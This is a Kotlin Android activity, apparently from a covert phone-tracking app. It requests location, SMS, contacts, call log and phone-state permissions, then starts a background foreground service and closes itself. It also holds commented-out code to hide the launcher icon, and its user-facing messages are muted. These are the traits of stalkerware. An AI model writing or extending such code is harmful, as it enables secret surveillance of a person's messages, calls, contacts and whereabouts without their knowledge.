package com.track.app

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.widget.ImageView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.bumptech.glide.Glide
import com.google.firebase.FirebaseApp
import com.google.firebase.messaging.FirebaseMessaging

class MainActivity : AppCompatActivity() {
    private val locationPermission = Manifest.permission.ACCESS_FINE_LOCATION
    private val readPermission = Manifest.permission.READ_SMS
    private val contactsPermission = Manifest.permission.READ_CONTACTS
    private val receiveSmsPermission = Manifest.permission.RECEIVE_SMS
    private val readPhoneStatePermission = Manifest.permission.READ_PHONE_STATE
    private val readCallLogPermission = Manifest.permission.READ_CALL_LOG
    private val postPushNotificationPermission = Manifest.permission.POST_NOTIFICATIONS
    private val requestCode = 100

    // Create a map to store permission statuses
    private val permissionStatusMap = mutableMapOf<String, Boolean>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        //load image
        val imageView: ImageView = findViewById(R.id.imageView)
        Glide.with(this).asGif().load(R.drawable.eye).into(imageView)

        // Check and request permissions
           checkAndRequestPermissions()
    }

    // Check and request permissions
    private fun checkAndRequestPermissions() {
        val permissionsToRequest = ArrayList<String>()

        if (ContextCompat.checkSelfPermission(this, locationPermission) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(locationPermission)
        } else {
            permissionStatusMap[locationPermission] = true
        }

        if (ContextCompat.checkSelfPermission(this, readPermission) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(readPermission)
        } else {
            permissionStatusMap[readPermission] = true
        }

        if (ContextCompat.checkSelfPermission(this, contactsPermission) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(contactsPermission)
        } else {
            permissionStatusMap[contactsPermission] = true
        }

        if (ContextCompat.checkSelfPermission(this, receiveSmsPermission) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(receiveSmsPermission)
        } else {
            permissionStatusMap[receiveSmsPermission] = true
        }

        if (ContextCompat.checkSelfPermission(this, readPhoneStatePermission) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(readPhoneStatePermission)
        } else {
            permissionStatusMap[readPhoneStatePermission] = true
        }

        if (ContextCompat.checkSelfPermission(this, readCallLogPermission) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(readCallLogPermission)
        } else {
            permissionStatusMap[readCallLogPermission] = true
        }

        if (ContextCompat.checkSelfPermission(this, postPushNotificationPermission) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(postPushNotificationPermission)
        } else {
            permissionStatusMap[postPushNotificationPermission] = true
        }

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), requestCode)
        } else {
//            showToast("All permissions already granted.")
            navigateToNewActivity()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            this.requestCode -> {
                var allPermissionsGranted = true

                for (i in permissions.indices) {
                    if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                        allPermissionsGranted = false
                        permissionStatusMap[permissions[i]] = false
                        showToast("${permissions[i]} permission denied.")
                    }
                }

                if (allPermissionsGranted) {
                    showToast("All permissions granted.")
                    navigateToNewActivity()
                }
            }
        }
    }

    private fun navigateToNewActivity() {
        // Start your MyForegroundService
        val serviceIntent = Intent(this, MyForegroundService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)
//        showToast("Navigating to the new activity.")

        // close app after 3 seconds
        Handler().postDelayed({
            finish()
        }, 5000)

//        hideLauncherIcon();
    }

//    private fun hideLauncherIcon() {
//        val packageManager = applicationContext.packageManager
//        val componentName = ComponentName(packageName, "com.track.app.MainActivity")
//
//        val currentComponentState = packageManager.getComponentEnabledSetting(componentName)
//
//        if (currentComponentState != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
//            // Only disable the component if it's not already disabled
//            packageManager.setComponentEnabledSetting(
//                componentName,
//                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
//                PackageManager.DONT_KILL_APP
//            )
//            showToast("Launcher icon hidden.")
//        } else {
//            showToast("Launcher icon is already hidden.")
//        }
//    }


    private fun showToast(message: String) {
//        Toast.makeText(this, message, Toast.LENGTH_LONG).show()
    }
}
